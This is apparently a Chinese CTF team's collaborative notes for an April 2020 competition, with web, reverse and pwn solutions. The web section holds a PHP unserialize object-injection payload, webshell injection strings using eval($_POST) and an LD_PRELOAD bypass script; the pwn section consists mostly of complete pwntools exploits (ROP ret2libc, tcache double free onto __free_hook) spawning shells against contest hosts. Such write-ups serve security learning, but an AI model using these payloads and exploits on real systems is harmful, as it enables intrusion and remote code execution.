

**èµ›äº‹ä¿¡æ¯**

* å®˜ç½‘åœ°å€ï¼š[https://www.linkedbyx.com/home](https://www.linkedbyx.com/home)
* ç«èµ›æ—¶é—´ï¼š2020.4.25 ï¼ˆå‘¨å…­ï¼‰ä¸‹åˆ13:30-17:30
# **Webï¼š**
## **ezunserialize | solved | working : glotozz, Imagin**

è€ƒç‚¹ï¼šå­—ç¬¦é€ƒé€¸æ³¨å…¥å¯¹è±¡+ç®€å•çš„POPé“¾

**POPé“¾**

ä¸»è¦æ˜¯åˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥è§¦å‘__toString()

| 123456 | $b = new B();$c = new C();$c->c = 'flag.php';$b->b = $c;$x = serialize($b);$y = unserialize($x); | 
|----|----|
**å­—ç¬¦é€ƒé€¸**

read()å’Œwrite()ä¸­å­˜åœ¨å­—ç¬¦é€ƒé€¸

æ¯”å¦‚è¾“å…¥1 1

| 1 | O:1:"A":2:{s:1:"a";s:1:"1";s:1:"b";s:1:"1";} | 
|----|----|
æ³¨å…¥ä¸€ä¸ªå¯¹è±¡

| 1 | ";s:0:"";O:1:"A":1:{s:1:"a";s:1:"1";}} | 
|----|----|
é•¿åº¦ä¸º38ï¼Œå› æ­¤éœ€è¦é€ƒé€¸çš„ä¸º";s:8:"password";s:38:"23ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯è¿™é‡Œéœ€è¦æ˜¯3çš„å€æ•°ï¼Œ

å‰é¢åŠ ä¸ª1ï¼Œ1";s:8:"password";s:38:"é€ƒé€¸24ä½å³å¯

?a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&b=1";s:0:"";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}}

flag{54c3439fe400834815e5fb576adfe04a}

[http://183.129.189.60:10028/?a=1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&b=;%22;s:8:%22password%22;O:1:%22B%22:1:{s:1:%22b%22;O:1:%22C%22:1:{s:1:%22c%22;s:8:%22flag.php%22;}}}%22;}](http://183.129.189.60:10028/?a=1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&b=;%22;s:8:%22password%22;O:1:%22B%22:1:{s:1:%22b%22;O:1:%22C%22:1:{s:1:%22c%22;s:8:%22flag.php%22;}}}%22;})

## web2|worked|working:glotozz  s1mple www shana Imagin Mrkaixin L1ngFeng

select * from user where user='$user' and passwd='%s'

é»‘åå•ï¼š \ '  like or flag || select union / -

%å¯ä»¥ç”¨

%1å¯ä»¥åƒæ‰usernameåé¢é‚£ä¸ªå•å¼•å·

ç”¨^å¯ä»¥

![å›¾ç‰‡](https://uploader.shimo.im/f/LusDIs1QSKUHJ3Dm.png!thumbnail)

æˆ‘ strings äº†ä¸€ä¸‹ æ²¡ä¸œè¥¿æˆ‘è¯•è¯•ç›²æ³¨

selectè¢«è¿‡æ»¤ï¼Œä¸å¤ªåƒç›²æ³¨

[http://183.129.189.60:10027/admin/admin.php](http://183.129.189.60:10027/admin/admin.php) è¿˜æœ‰ä¸‹ä¸€æ­¥

admin/GoODLUcKcTFer202OHAckFuN ç™»å½•

ä¸Šé¢çš„ç™»é™†æ˜¯åœ¨æ–°çš„é¡µé¢è¿›è¡Œï¼›

```php
Your sandbox: ./shells/Ex5xRmjE666uzon5/ set your shell
<?php
error_reporting(0);
session_save_path('session');
session_start();
require_onceÂ './init.php';
if($_SESSION['login']!=1){
Â Â Â Â die("<script>window.location.href='./index.php'</script>");
}
if($_GET['shell']){
Â Â Â Â $shell=Â addslashes($_GET['shell']);
Â Â Â Â $fileÂ =Â file_get_contents('./shell.php');
Â Â Â Â $fileÂ =Â preg_replace("/\\\$shellÂ =Â '.*';/s",Â "\$shellÂ =Â '{$shell}';",Â $file);
Â Â Â Â file_put_contents('./shell.php',Â $file);
}else{
Â Â Â Â echoÂ "setÂ yourÂ shell"."<br>";
Â Â Â Â chdir("/");
Â Â Â Â highlight_file(dirname(__FILE__)."/admin.php");
}
?>
```
/css/æ˜¯forbiddenæ²¡å•¥ç”¨
admin/admin.php

å¥—å¨ƒæ

æ„Ÿè§‰åƒæ˜¯Pç¥çš„é‚£ä¸ªæ”¹å†™é…ç½®æ–‡ä»¶getshellçš„æ–¹å‘

![å›¾ç‰‡](https://uploader.shimo.im/f/SRr6LNZLK9IKt2LZ.png!thumbnail)

[https://www.smi1e.top/%E5%B0%8F%E5%AF%86%E5%9C%88%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0/](https://www.smi1e.top/%E5%B0%8F%E5%AF%86%E5%9C%88%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0/)æœ‰ä¸€æ¨¡ä¸€æ ·çš„ï¼Œå•è¡Œæ¨¡å¼ï¼Œä½†æ˜¯æˆ‘çš„ç¯å¢ƒå¥½åƒæœ‰é—®é¢˜ï¼Œä¸€å¼€å§‹çš„æ–‡ä»¶å†…å®¹å¥½åƒä¸ä¸€æ ·ã€‚å¯èƒ½æ˜¯æˆ‘æ‰“åäº†å“ˆå“ˆ

[http://183.129.189.60:10041/admin/shells/Ex5xRmjE666uzon5/shell.php](http://183.129.189.60:10041/admin/shells/Ex5xRmjE666uzon5/shell.php)

![å›¾ç‰‡](https://uploader.shimo.im/f/zzXkN8kUTuD2OAC7.png!thumbnail)

æˆ‘æœ¬åœ°å¤§æˆåŠŸäº†ï¼Œ ä½†æ˜¯è¿œç¨‹å¥½åƒä¸å¤ªè¡Œ

è¯•ç€ä¼ äº†å‡ ä¸ª 500 ... é«˜å¸ˆå‚…è¯•è¯•è¿™ä¸ªé¶æœºï¼Ÿ

ä½ å…ˆæœ¬åœ°æµ‹å°±è¡Œï¼Œæˆ‘é‚£ä¸ªå›ä¸å»äº†ã€‚å› ä¸ºä½ çš„å†…å®¹å¯èƒ½æœ‰é—®é¢˜ï¼Œå›ä¸å»äº†å•Šå“ˆå“ˆ

okk

ç¡®å®è€æ˜¯500å“­äº†,ä½†æ˜¯æ²¡æ³•getshellï¼Œä»–è½¬ä¹‰äº†

æˆ‘æˆåŠŸäº†ï¼›å¯ä»¥è¯»åˆ°phpinfo; php7.4.5  å°±æ˜¯imaginå¸ˆå‚…çš„é‚£ç§ï¼›

```plain
;eval($_POST[c]);
$0
```
è¿™ä¸ªå¯ä»¥
è¿™æ ·ä¹Ÿå¯ä»¥ getshell

```plain
http://183.129.189.60:10006/admin/admin.php?shell=\';phpinfo();//
```
?shell=;eval($_POST[cmd]);
?shell=$0

ä½ è¯•è¯•ï¼Œä½ å¾—å‘sessionæˆ‘æ‰èƒ½ç”¨ä½ çš„ï¼Œ qaqæˆ‘è¯•è¿‡å•¦ 500æ¥çš„

æˆ‘çš„æœ¨é©¬å†™å…¥äº†ï¼›å¯ä»¥å†™å…¥æœ¨é©¬ï¼›ç°åœ¨å°±æ˜¯bypassäº†ï¼›æˆ‘çš„èšå‰‘å‡ºäº†é—®é¢˜å“ªä½å¸ˆå‚…ç»§ç»­ä¸€ä¸‹ï¼Œå¥½åƒä¸Šä¼ soåº“ï¼›é¢˜ç›®ç»™äº†ï¼›![å›¾ç‰‡](https://uploader.shimo.im/f/LGIN20hOeUc2jXl7.png!thumbnail)

[http://183.129.189.60:10027/admin/shells/O66IPK5LO5h88ABX/shell.php?a=var_dump(scandir(%22/%22));](http://183.129.189.60:10027/admin/shells/O66IPK5LO5h88ABX/shell.php?a=var_dump(scandir(%22/%22));)å¥½åƒç›´æ¥è¿”å›bool(é”™è¯¯)

å¥½åƒæ²¡æ³•ç›´æ¥è¯»flag

open_basedirï¼Œé¥¶ä¸‹ã€‚ç¡®å®ini_setè¢«è¿‡æ»¤äº†ç”¨ä¸äº†

ä¼¼ä¹ç»•ä¸è¿‡open_basedirï¼Œæ„Ÿè§‰æ˜¯ç”¨soåº“å§

é¢˜ç›®ç»™äº†bypassçš„soåº“ï¼Œæˆ‘è§‰å¾—68975597559775577555ä¼ ä¸€ä¸‹å¯èƒ½çš„å§ï¼›èšå‰‘å¯ä»¥æ¥ä¸€ä¸‹ï¼›å’Œ

å›½èµ›æœ‰ä¸€é“so åº“ä¸€æ ·çš„ï¼›æˆ‘èšå‰‘å‡ºäº†ç‚¹é—®é¢˜  å¸ˆå‚…ä»¬ææï¼Ÿ

[http://183.129.189.60:10041/admin/shells/shell.php](http://183.129.189.60:10041/admin/shells/shell.php)   nep

soåº“ç”¨ä»€ä¹ˆå‡½æ•°è§¦å‘ï¼Œmailå’Œerror_logè¢«ç¦ç”¨äº†ã€‚å…ˆè¯•è¯•php7é‚£ä¸ª

å¥½åƒæ˜¯putenv ç„¶åç”¨mail

èƒ½æŠŠsoåç¼–è¯‘å˜›ï¼Œçœ‹çœ‹soå’‹å†™çš„

è¿™ä¸ªç‰ˆæœ¬å¤ªæ–°äº†ï¼Œä¹‹å‰çš„ uaf çš„æ‰“ä¸å‡ºæ¥

```php
<?php
	echo "Source: <BR>";
	show_source(__FILE__);
	echo "<HR>";
	if(isset($_GET['cmd']) && isset($_GET['sharedObject']) ){
	 $cmd = $_GET['cmd'];
	 echo "Executing $cmd..";
	 putenv("CMD=$cmd");
	 $sharedObject = $_GET['sharedObject'];
	 putenv("LD_LIBRARY_PATH=$sharedObject");
	 mail('g','i','o','o');
	}
	?>
```
â†‘è¿™ä¸ªæ²¡ç”¨å§ï¼Œæˆ‘è¯•è¿‡äº† å—¯ æˆ‘å»githubæ‰¾æ‰¾ so èƒ½åç¼–è¯‘å˜› å™— å¥½åƒéœ€è¦ä¸€ä¸ªäºŒè¿›åˆ¶å¸ˆå‚…
éš¾é¡¶ æ²¡å¾—ç”¨ Referenceï¼š[https://giovan.nl/posts/disable-functions-bypass/](https://giovan.nl/posts/disable-functions-bypass/)

mail()ç¦ç”¨äº†ï¼Œerror_Log()ä¹Ÿç¦ç”¨äº†ï¼Œç°åœ¨å¾—çœ‹soç”Ÿæˆä¹‹å‰çš„ä»£ç 

![å›¾ç‰‡](https://uploader.shimo.im/f/KjJFR3znp78D6fCi.png!thumbnail)

ida64 çœ‹åˆ°åé—¨ ä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆåˆ©ç”¨23333

[https://www.anquanke.com/post/id/175403](https://www.anquanke.com/post/id/175403)

åé—¨æœ‰ç‚¹åƒè¿™ä¸ª[https://www.cnblogs.com/BOHB-yunying/p/11691382.html](https://www.cnblogs.com/BOHB-yunying/p/11691382.html)

å“ªä¸ªå‡½æ•°è°ƒç”¨äº†preload?   â†‘ æˆ‘æ„Ÿè§‰è¿™ä¸ªæœ‰æå¤´ å°±æ˜¯æ²¡æœ‰wmvæ–‡ä»¶

æŒ‰.soçš„æ„æ€ï¼Œå°±æ˜¯å–"evil_cmdline"è¿™ä¸ªç¯å¢ƒå˜é‡çš„å€¼.ä¸€èˆ¬æ¥è¯´ï¼Œbinè¿™é‡Œæ‹¿shellï¼Œå°±æ˜¯"evil_cmdline"é‡Œå†™'/bin/sh\x00'.

å…¶å®åªè¦æ‰¾åˆ°è°ƒç”¨äº†preloadè¿™ä¸ªå‡½æ•°çš„phpå‡½æ•°å°±è¡Œäº†å§,ç„¶åè°ƒç”¨çš„æ—¶å€™ä¼šè§¦å‘soé‡Œé¢çš„preloadè¿™æ ·å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†å§ã€‚bingoï¼è¿™ä¸ªåº”è¯¥æ˜¯ä¸€ä¸ªæå‰åŠ è½½çš„ï¼Œåº”è¯¥åœ¨phpinfoä¸­æœ‰çº¿ç´¢ â†æˆ‘æ²¡æ‰¾åˆ°

[https://www.anquanke.com/post/id/175403](https://www.anquanke.com/post/id/175403)è¿™ä¸ªæ–‡ç« ä¸­è¯´äº†æ€ä¹ˆæ‰¾

é‚£ä¸ª.htaccessï¼ˆä¸æ˜¯è¿™ä¸ªï¼‰

è¯è¯´ proload å¥½åƒæ˜¯ php 7.4 çš„æ–°ç‰¹æ€§

å…„å¼Ÿä»¬ï¼Œä¸èƒ½è‡ªå·±åŠ æ‰©å±•ï¼Œå°±ç ”ç©¶ä»–ç»™çš„soæ–‡ä»¶å§

![å›¾ç‰‡](https://uploader.shimo.im/f/iX8uCq4HqPb7DqNB.png!thumbnail)

ğŸ¤¦â€â™‚ï¸

å‡ºhintäº†ï¼š	åˆ«çœ‹ so äº†ï¼Œå…ˆæ¥æ‰“ä¸€ä¸‹è¯•è¯•å‘€ã€‚é‡ soï¼Œä¸è¦æ€•ï¼Œå¥¥åŠ›ç»™ï¼ wtf

FFI::load æ‰“ä¸å‡ºæ¥




# **R****everseï¼š**

## **å…¥é—¨reverse | SOLVED | working : R3gr3t**

daef_wef_reverse_sss

```python
str1 = "akhb~chdaZrdaZudqduvdZvvv|"
flag = ''
for i in str1:
    flag += chr((ord(i) - 1) ^ 6)
print flag
```
## **å…¥é—¨reverse | SOLVED | working : lzyddf**

```c++
#include <stdio.h>
#include <windows.h>
int main()
{
	char s[] = {"akhb~chdaZrdaZudqduvdZvvv|"};
	for(int i=0; i< strlen(s); i++)
	{
		printf("%c", (s[i]-1)^6);
	}
}Â 
```
## encrypt3 ** | SOLVED | working : Qfrost, bi0xï¼Œkittener**

```python
enc1 = [38, 44, 33, 39, 59,
        35, 34, 115, 117, 114,
        113, 33, 36, 117, 118,
        119, 35, 120, 38, 114,
        117, 113, 38, 34, 113,
        114, 117, 114, 36, 112,
        115, 118, 121, 112, 35,
        37, 121, 61]
for i in range(128):
    flag = ''
    for j in enc1:
        flag += chr(j ^ i)
    if 'flag{' in flag:
        print flag
```
å…¶å®å¯ä»¥çœ‹å‡ºæ¥æ¯æ¬¡å¼‚æˆ–çš„æ•°éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥ç›´æ¥å¼‚æˆ–64å°±æ¬§å…‹äº†

æ‰¾åˆ°å¸¦flag{}çš„å°±è¡Œäº†ï¼Œ**ç›´æ¥çˆ†æœ**

å¼€å¤´å¿…ä¸ºâ€œflagâ€ï¼Œkeyå›ºå®šï¼Œç›´æ¥ç®—å‡ºkey = 38Â ^Â ord('f')  

## encrypt3 ** | SOLVED | working : lzyddf**

```c++
#include <stdio.h>
#include <windows.h>
int main()
{
	BYTE s[] = {
		 0x26,0x2c,0x21,0x27,0x3b,0x23,0x22,0x73
		,0x75,0x72,0x71,0x21,0x24,0x75,0x76,0x77
		,0x23,0x78,0x26,0x72,0x75,0x71,0x26,0x22
		,0x71,0x72,0x75,0x72,0x24,0x70,0x73,0x76
		,0x79,0x70,0x23,0x25,0x79,0x3d};
		
	for(int k=0; k<255; k++)
	{
		for(int i=0; i<strlen((char*)s); i++)
		{
			printf("%c", s[i] ^ k);
		}
		printf("\n");
	}
}Â 
```
## ![å›¾ç‰‡](https://uploader.shimo.im/f/7bffyjAAUlJUz9rn.png!thumbnail)

## sm | SOLVED | working ï¼šQFORST,BAYERISCHEN

åŸæ±åŸå‘³çš„SM4

å¯†æ–‡0xC0797766,0x77E5AC99,0x31C567EB,0x470645A7

å¯†é’¥0x1234567,Â  0x89ABCDEF,Â  0xFEDCBA98,Â  0x76543210

ç›´æ¥è§£å¯†å³å¯ã€‚ECBæ¨¡å¼ã€‚

```plain
from pysm4 import encrypt, decrypt

mk =0x0123456789abcdeffedcba9876543210
cipher_num = 0xC079776677E5AC9931C567EB470645A7
clear_num=decrypt(cipher_num,mk)
print (hex(clear_num)[2:].replace('L', ''))
```
# **Pwnï¼š**

## echo server** | SOLVED | working : TaQini,keer**

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini
from pwn import *
local_fileÂ  = './test'
local_libcÂ  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = './libc.so.6'
is_local = False
is_remote = False
if len(sys.argv) == 1:
Â Â Â  is_local = True
Â Â Â  p = process(local_file)
Â Â Â  libc = ELF(local_libc)
elif len(sys.argv) > 1:
Â Â Â  is_remote = True
Â Â Â  if len(sys.argv) == 3:
Â Â Â Â Â Â Â  host = sys.argv[1]
Â Â Â Â Â Â Â  port = sys.argv[2]
Â Â Â  else:
Â Â Â Â Â Â Â  host, port = sys.argv[1].split(':')
Â Â Â  p = remote(host, port)
Â Â Â  libc = ELF(remote_libc)
elf = ELF(local_file)
context.log_level = 'debug'
context.arch = elf.arch
seÂ Â Â Â Â  = lambda dataÂ Â Â Â Â Â Â Â Â Â Â Â Â Â  :p.send(data)
saÂ Â Â Â Â  = lambda delim,dataÂ Â Â Â Â Â Â Â  :p.sendafter(delim, data)
slÂ Â Â Â Â  = lambda dataÂ Â Â Â Â Â Â Â Â Â Â Â Â Â  :p.sendline(data)
slaÂ Â Â Â  = lambda delim,dataÂ Â Â Â Â Â Â Â  :p.sendlineafter(delim, data)
seaÂ Â Â Â  = lambda delim,dataÂ Â Â Â Â Â Â Â  :p.sendafter(delim, data)
rcÂ Â Â Â Â  = lambda numb=4096Â Â Â Â Â Â Â Â Â  :p.recv(numb)
ruÂ Â Â Â Â  = lambda delims, drop=TrueÂ  :p.recvuntil(delims, drop)
uu32Â Â Â  = lambda dataÂ Â Â Â Â Â Â Â Â Â Â Â Â Â  :u32(data.ljust(4, '\0'))
uu64Â Â Â  = lambda dataÂ Â Â Â Â Â Â Â Â Â Â Â Â Â  :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addrÂ Â Â Â Â Â Â  :p.info(tag + ': {:#x}'.format(addr))
def debug(cmd=''):
Â Â Â  if is_local: gdb.attach(p,cmd)
# info
# gadget
prdi = 0x0000000000400823 # pop rdi ; ret
retÂ  = 0x000000000040055e # ret
# elf, libc
main = 0x400769
# rop1
offset = 136-8
payload = '\0'*offset
payload += p64(elf.bss()+0x800)
# ret2text printf(got[printf])
payload += p64(prdi)+p64(elf.got['printf'])+p64(0x4006EE)+p64(main)
sla('how long is your name: ','1000')
sla('and what\'s you name? ',payload)
ru('hello ')
printf = uu64(rc(14))
info_addr('printf',printf)
libcbase = printf - libc.sym['printf']
system = libcbase + libc.sym['system']
binsh = libcbaseÂ  + libc.search("/bin/sh").next()
offset = 136-8
pl2 = '\0'*offset
pl2 += p64(elf.bss()+0x800)
pl2 += p64(ret)+p64(prdi)+p64(binsh)+p64(system)+p64(main)
debug()Â  Â 
sl('1000')
sla('and what\'s you name? ',pl2)
# ru('hello ')
# log.warning('--------------')
p.interactive()
```
## echo server** | SOLVED | working : lzyddf**

```python
#-*- coding: utf-8 -*-
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = 'debug'
#context.arch = 'i386'/'amd64'
p = 0
if p == 0:
	sh = process('./echo_server')
else:
	sh = remote('183.129.189.60', 10005)
	
elfÂ  = ELF('./echo_server')
main_addr = 0x4005c0
printf_plt = elf.symbols['printf']
read_got = elf.got['read']
format_s = 0x400875
pop_rsi_r15_ret = 0x400821
pop_rdi_ret = 0x400823
ret = 0x400824
sh.sendlineafter('name: ', '1000');
payloadÂ  = 'a'*136
payload += p64(pop_rdi_ret) + p64(format_s)
payload += p64(pop_rsi_r15_ret) + p64(read_got) + p64(read_got)
payload += p64(printf_plt) + p64(main_addr)
sh.sendafter('name? ', payload)
sh.recvuntil('@hello ')
read_addr = u64(sh.recv(6).ljust(8, '\x00'))
print('read_addr = ' + hex(read_addr))
libc = LibcSearcher('read', read_addr) #libc6_2.27-3ubuntu1_amd64
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')
sh.sendlineafter('name: ', '1000');
payloadÂ  = 'a'*136
payload += p64(pop_rdi_ret) + p64(bin_sh_addr)
payload += p64(ret) + p64(system_addr) + p64(main_addr)
sh.sendafter('name? ', payload)
sh.interactive()
```
## **sales_office | SOLVED | working : youn9ï¼Œzhz , Nopï¼Œkeerï¼ŒFMYY**

```
#Msk
from PwnContext import *
context.log_level = 'debug'
ctx.binary = 'sales_office'
ctx.remote_libc = '/home/msk/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'
ctx.debug_remote_libc = True
libc = ELF('/home/msk/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
def cmd(idx):
Â Â Â  ctx.recvuntil("choice:")
Â Â Â  ctx.sendline(str(idx))
def add(size,dec):
Â Â Â  cmd(1)
Â Â Â  ctx.recvuntil("Please input the size of your house:\n")
Â Â Â  ctx.sendline(str(size))
Â Â Â  ctx.recvuntil("please decorate your house:\n")
Â Â Â  ctx.send(dec)
def show(idx):
Â Â Â  cmd(3)
Â Â Â  ctx.recvuntil('index:\n')
Â Â Â  ctx.sendline(str(idx))
def delete(idx):
Â Â Â  cmd(4)
Â Â Â  ctx.recvuntil('index:\n')
Â Â Â  ctx.sendline(str(idx))
def z():
Â Â Â  ctx.debug()
ctx.start()
add(0x60,'a'*0x60) #0
add(0x60,'a'*0x60) #1
add(0x10,p64(0x602020)+p64(0x100)) #2Â  0x390
delete(0)
delete(1)
delete(0)
delete(1)
show(0)
ctx.recvuntil("house:\n")
leak = ctx.recvuntil("\n")[:-1]
heap = u64(leak.ljust(0x8,'\x00'))
log.info("heap = " + hex(heap))
add(0x10,p64(0x6020a0))
add(0x10,p64(heap+0x140))
show(0)
ctx.recvuntil("house:\n")
leak = ctx.recvuntil("\n")[:-1]
puts_addr = u64(leak.ljust(0x8,'\x00'))
log.info("puts = " + hex(puts_addr))
libcbase = puts_addr - libc.symbols["puts"]
system = libcbase + libc.symbols['system']
free_hook = libcbase + libc.symbols['__free_hook']
Â 
delete(2)
delete(2)
delete(1)
add(0x20,'a'*0x20)
add(0x10,p64(free_hook))
add(0x20,'/bin/sh\x00')
add(0x10,p64(system))
delete(7)
#z()
ctx.interactive()
```
```plain
#keer
import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='sales_office'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.27")
pdbg.remote('183.129.189.60',10060)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			io=pdbg.run("debug")
			# io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('./libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,c):
			io.sendlineafter('choice:','1')
			io.sendlineafter('Please input the size of your house:',str(a))
			io.sendafter('please decorate your house:',c)
		def delete(a):
			io.sendlineafter('choice:','4')
			io.sendlineafter('index:\n',str(a))

		def show(a):
			io.sendlineafter('choice:','3')
			io.sendlineafter('index:\n',str(a))
		
		
		add(0x28,(p64(0)+p64(0x61))*1)
		add(0x28,(p64(0)+p64(0x21))*1)
		add(0x38,(p64(0)+p64(0x21))*1)
		add(0x48,'a')
		add(0x58,'/bin/sh\x00')
		delete(1)
		delete(0)
		add(0x18,p64(elf.got['free']))
		show(1)
		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['free']
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()

		delete(2)
		delete(2)
		delete(3)
		add(0x18,p64(libc.sym['__free_hook']))
		add(0x18,p64(system_addr))
		delete(4)
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		io.interactive()
	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue
```


```plain
#FMYY
from pwn import*
def new(size,content):
Â Â Â  p.sendlineafter('choice:','1')
Â Â Â  p.sendlineafter('house:',str(size))
Â Â Â  p.sendafter('your house:',content)
def show(index):
Â Â Â  p.sendlineafter('choice:','3')
Â Â Â  p.sendlineafter('index:',str(index))
def free(index):
Â Â Â  p.sendlineafter('choice:','4')
Â Â Â  p.sendlineafter('index:',str(index))
p = process('./main')
p = remote('183.129.189.60',10060)
elf =ELF('./main')
libc = ELF('./libc-2.27.so',checksec=False)
new(0x10,'FMYY') #0
new(0x10,'FMYY') #1
new(0x10,'FMYY') #2
new(0x10,'FMYY') #3
#---------
free(2)
free(0)
free(0)
show(0)
p.recvuntil('house:\n')
heap_base = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - 0x260
log.info('HEAP:\t'+ hex(heap_base))
new(0x10,p64(heap_base + 0x2A0))
new(0x20,'FMYY')
new(0x10,p64(elf.got['__libc_start_main']))
show(1)
p.recvuntil('house:\n')
libc_base = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - libc.sym['__libc_start_main']
log.info('LIBC:\t' + hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
#------------
free(3)
free(3)
new(0x10,p64(free_hook))
new(0x20,'/bin/sh\x00')
new(0x10,p64(system))
free(8)
p.interactive()
```
## **sales_office2 | SOLVED | working : keer ï¼Œ NOPï¼ŒFMYY**


```plain
import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='sales_office2'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("./libc.so")
pdbg.debug("2.29")
pdbg.remote('das.wetolink.com',28499)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			io=pdbg.run("debug")
			# io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('./libc.so')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,c):
			io.sendlineafter('choice:','1')
			io.sendlineafter('Please input the size of your house:',str(a))
			io.sendafter('please decorate your house:',c)
		def delete(a):
			io.sendlineafter('choice:','4')
			io.sendlineafter('index:\n',str(a))

		def show(a):
			io.sendlineafter('choice:','3')
			io.sendlineafter('index:\n',str(a))
		
		
		add(0x58,(p64(0)+p64(0x61))*5)
		add(0x28,(p64(0)+p64(0x21))*2)
		add(0x38,(p64(0)+p64(0x21))*3)
		add(0x48,(p64(0)+p64(0x21))*4)
		add(0x58,'/bin/sh\x00')
		delete(2)
		delete(1)
		delete(0)
		show(0)
		io.recvline()
		heap_base=u64(io.recvline()[:-1].ljust(8,'\x00'))-0x330
		add(0x18,p64(elf.got['free']))
		show(1)
		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['free']
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		delete(3)
		add(0x18,p64(heap_base+0x2d0))
		delete(2)
		add(0x58,'\x00'*0x28+p64(0x31)+p64(libc.sym['__free_hook']))
		add(0x28,'a')
		add(0x28,p64(system_addr))
		delete(4)

		success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		io.interactive()
	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue
flagï¼šTHE_FLAG_OF_THIS_STRING
```
```plain
#Nop
from PwnContext import *
context.log_level = 'debug'
ctx.binary = 'sales_office'
ctx.remote_libc = '/home/msk/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so'
ctx.debug_remote_libc = True
ctx.remote = ('das.wetolink.com',28499)
libc = ELF('/home/msk/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so')
def cmd(idx):
Â Â Â  ctx.recvuntil("choice:")
Â Â Â  ctx.sendline(str(idx))
def add(size,dec):
Â Â Â  cmd(1)
Â Â Â  ctx.recvuntil("Please input the size of your house:\n")
Â Â Â  ctx.sendline(str(size))
Â Â Â  ctx.recvuntil("please decorate your house:\n")
Â Â Â  ctx.send(dec)
def show(idx):
Â Â Â  cmd(3)
Â Â Â  ctx.recvuntil('index:\n')
Â Â Â  ctx.sendline(str(idx))
def delete(idx):
Â Â Â  cmd(4)
Â Â Â  ctx.recvuntil('index:\n')
Â Â Â  ctx.sendline(str(idx))
def z():
Â Â Â  ctx.debug()
ctx.start('remote')
add(0x60,'a'*0x60) #0
add(0x60,'b'*0x60) #1
delete(0)
delete(1)
add(0x10,p64(0x602020)+p64(0x100)) #2
show(0)
ctx.recvuntil("house:\n")
leak = ctx.recvuntil("\n")[:-1]
puts_addr = u64(leak.ljust(8,'\x00'))
libcbase = puts_addr - libc.symbols["puts"]
log.info("libcbase =" + hex(libcbase))
free_hook = libcbase + libc.symbols["__free_hook"]
system = libcbase + libc.symbols["system"]
delete(2)
add(0x10,p64(0x6020b0)+p64(0x100)) #3
show(0)
ctx.recvuntil("house:\n")
leak = ctx.recvuntil("\n")[:-1]
heap = u64(leak.ljust(8,'\x00'))
log.info("heap = " + hex(heap))
add(0x60,'a'*0x30+p64(0)+p64(0x31)+'a'*0x20)Â  #4
add(0x60,'b'*0x50+p64(0)+p64(0x71)) #0x2d0Â  5
delete(4)
delete(3)
add(0x10,p64(heap-0x10)+p64(0x100)) #6
delete(0)
add(0x60,p64(0)*5+p64(0x71)+p64(free_hook)) #7
add(0x60,'/bin/sh\x00') #8
add(0x60,p64(system)) #9
delete(8)
